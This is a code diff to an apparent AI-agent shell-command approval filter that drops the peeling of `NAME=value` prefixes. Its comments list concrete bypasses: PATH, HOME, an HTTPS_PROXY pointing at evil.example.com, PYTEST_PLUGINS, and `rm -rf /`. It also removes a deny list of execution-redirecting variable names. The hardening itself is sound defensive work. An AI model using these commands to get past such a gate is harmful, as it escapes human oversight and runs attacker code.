@@ -59,132 +59,42 @@ const GRAMMAR_PREFIX_KEYWORDS: readonly string[] = [
 ];
 
 /**
- * A leading `NAME=value` assignment (#999 follow-up).
+ * A leading `NAME=value` assignment.
  *
- * Measured at 150 of 678 uncovered real main-agent commands, the single
- * largest cohort. An assignment computes a value and runs no command, so it is
- * peeled exactly like a grammar keyword — and for the same reason it must be
- * PEELED rather than treated as benign: an assignment can PREFIX a command
- * (`FOO=bar rm -rf /` really does run `rm`), so the remainder has to be judged.
+ * NEVER peeled, and the reasoning is worth keeping because three separate
+ * attempts to make it safe all failed, each from a direction the previous fix
+ * did not anticipate:
  *
- * A value that runs something is a command substitution, and `hasShellControl`
- * has already refused the whole segment before this is reached — which is why
- * `TOK=$(jq -r .sccn ~/.config/cfman/tokens.json)` stays an escalation.
+ *   1. peel any assignment       -> `PATH=/evil/bin git status` approved `git`
+ *                                   while `/evil/bin/git` ran
+ *   2. refuse dangerous NAMES    -> `HOME=/tmp/evil git commit` ran an
+ *                                   attacker's `pre-commit` via `core.hooksPath`
+ *   3. refuse path-shaped VALUES -> `HTTPS_PROXY=host:port gh pr view` handed a
+ *                                   network position the request
+ *   4. require OPAQUE values     -> `PYTEST_PLUGINS=evil_plugin pytest` imports
+ *                                   arbitrary Python, at the SHIPPED DEFAULT
+ *                                   level, and `evil_plugin` is exactly as
+ *                                   opaque as the benign `ACC=da8d7a2a868`
  *
- * The quoted alternatives come first so a value containing spaces is consumed
- * whole: `FOO="a b" git status` must leave `git status`, not `b" git status`.
+ * (4) is the one that settles it. No property of the assignment can separate
+ * those two strings, because the danger is not in the assignment at all — it is
+ * in what the TOOL does with the variable, and any tool may give any name any
+ * meaning. A rule that inspects only the assignment is answering a question the
+ * assignment does not contain.
+ *
+ * So an assignment prefix simply is not covered, and the command escalates.
+ * That costs the ~150 real commands this was measured to cover
+ * (`ACC=da8d7a2a868 git status` and friends), which is the correct trade
+ * against arbitrary code execution with no opt-in. Restoring coverage safely
+ * would mean knowing a specific (variable, command) pair is inert — a
+ * per-command allowlist, not a value heuristic. That is a separate design, not
+ * a widening of this one.
  */
-const ASSIGNMENT_PREFIX_RE = /^([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S*)(?:\s+|$)/;
+const ASSIGNMENT_HEAD_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;
 
-/**
- * An assignment is peeled ONLY when its value is an OPAQUE TOKEN — no path, no
- * endpoint, no structure of any kind. Allowlist, not denylist, and on the VALUE
- * rather than the variable name.
- *
- * Two rounds of review drove this. First: `HOME=/tmp/evilhome git commit` peeled
- * to a covered `git commit` while a `.gitconfig` at the redirected HOME set
- * `core.hooksPath` and ran an attacker's `pre-commit` — proven end to end
- * against real git. Enumerating tool names (`HOME`, `XDG_CONFIG_HOME`,
- * `KUBECONFIG`, `AWS_CONFIG_FILE`, `DOCKER_CONFIG`, ...) is a race that cannot
- * be won, so the test moved to the value: does it point somewhere?
- *
- * Second: "points somewhere" was still too narrow. `HTTPS_PROXY=evil.example.com:8080
- * gh pr view 1` contains no `/` and no `~`, and `gh` honours it — approved at
- * `trusted` with no opt-in, handing an attacker-controlled network position the
- * request metadata. Not every dangerous value is path-SHAPED.
- *
- * So the rule is inverted: instead of naming the shapes that are dangerous
- * (unbounded), name the one shape that is safe. A value of letters, digits,
- * dots, dashes, underscores, commas and pluses cannot name a filesystem
- * location, a host:port, a URL, or a user@host. Everything else escalates.
- *
- * The benign cohort this feature exists for passes cleanly — measured on real
- * traffic they are opaque tokens (`ACC=da8d7a2a868`, `ZONE=e684135de46029c`,
- * `HITS=0`). An honest `D=/some/dir` or `TZ=America/New_York` costs one prompt,
- * which is the right direction to be wrong in.
- */
-const OPAQUE_VALUE_RE = /^[A-Za-z0-9._,+-]*$/;
-
-/**
- * True if a leading `NAME=value` token may be removed without changing what the
- * rest of the command means.
- *
- * Exported because `risk-bands.ts` strips assignments too, on its own path to
- * `enforceRiskCeiling`. It had its own recognizer that stripped EVERY
- * assignment unconditionally, so `HOME=/tmp/evilhome git commit` graded
- * `moderate` — identical to a plain `git commit` — and the ceiling that exists
- * to override a wrong LLM approval could never fire on it. Two consumers
- * deriving the same judgement from two different pieces of code, which is the
- * fourth instance of that shape in this module; the answer each time is one
- * function, shared.
- */
-export function isPeelableAssignment(name: string, rawValue: string): boolean {
-  if (redirectsExecution(name)) return false;
-  return OPAQUE_VALUE_RE.test(rawValue.replace(/^["']|["']$/g, ''));
-}
-
-/**
- * Variables whose assignment changes WHICH program a command name resolves to,
- * or interposes code into it. These may never be peeled.
- *
- * Found by probing this module's own assignment handling: `PATH=/evil/bin git
- * status` was matching `vcs-read:git status`, approving the NAME `git` while
- * `/evil/bin/git` is what would actually run. Peeling an assignment is only
- * sound because an assignment runs nothing — and that argument fails precisely
- * for the variables that redirect execution.
- *
- * Prefix entries cover whole families (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`,
- * `GIT_SSH_COMMAND`, `PYTHONSTARTUP`, `NODE_OPTIONS`, ...). Deliberately
- * over-broad: a refused `GIT_BRANCH=x` costs one prompt, a peeled
- * `GIT_SSH_COMMAND=...` runs an attacker's binary under an approved name.
- */
-const EXECUTION_INFLUENCING_NAMES: readonly string[] = [
-  'PATH',
-  'IFS',
-  'ENV',
-  'SHELL',
-  'SHELLOPTS',
-  'BASHOPTS',
-  'CDPATH',
-  'PS4',
-  'PROMPT_COMMAND',
-  'EDITOR',
-  'VISUAL',
-  'PAGER',
-  'MANPATH',
-  // Config-location redirection (#1004 review). Covered by the value test as
-  // well whenever the value is a real path; listed here so a relative or
-  // otherwise path-free spelling is refused too.
-  'HOME',
-  'KUBECONFIG',
-  'LESSOPEN',
-  'MANPAGER',
-  'TERMINFO',
-  'POSIXLY_CORRECT',
-];
-const EXECUTION_INFLUENCING_PREFIXES: readonly string[] = [
-  'LD_',
-  'DYLD_',
-  'GIT_',
-  'BASH_',
-  'PYTHON',
-  'PERL',
-  'RUBY',
-  'NODE_',
-  'JAVA_',
-  'npm_',
-  'XDG_',
-  'AWS_',
-  'DOCKER_',
-  'GH_',
-  'SSH_',
-];
-
-function redirectsExecution(name: string): boolean {
-  return (
-    EXECUTION_INFLUENCING_NAMES.includes(name) ||
-    EXECUTION_INFLUENCING_PREFIXES.some((p) => name.startsWith(p))
-  );
+/** True if the segment's first word is a `NAME=value` assignment. */
+export function hasAssignmentPrefix(segment: string): boolean {
+  return ASSIGNMENT_HEAD_RE.test(segment.trim());
 }
 
 /**
@@ -240,14 +150,7 @@ export function stripShellGrammar(segment: string): StrippedSegment {
   // or `do FOO=bar git status`.
   for (;;) {
     const keyword = matchPrefix(rest, GRAMMAR_PREFIX_KEYWORDS);
-    if (keyword === null) {
-      const assignment = ASSIGNMENT_PREFIX_RE.exec(rest);
-      if (assignment === null) break;
-      if (!isPeelableAssignment(assignment[1] ?? '', assignment[2] ?? '')) break;
-      rest = rest.slice(assignment[0].length).trim();
-      if (rest === '') return { command: '', structural: true };
-      continue;
-    }
+    if (keyword === null) break;
     rest = rest.slice(keyword.length).trim();
     // A `for`/`case` header can follow a keyword too: `do for f in a b`.
     if (FOR_HEADER_RE.test(rest) || CASE_HEADER_RE.test(rest) || LOOP_CONTROL_RE.test(rest)) {
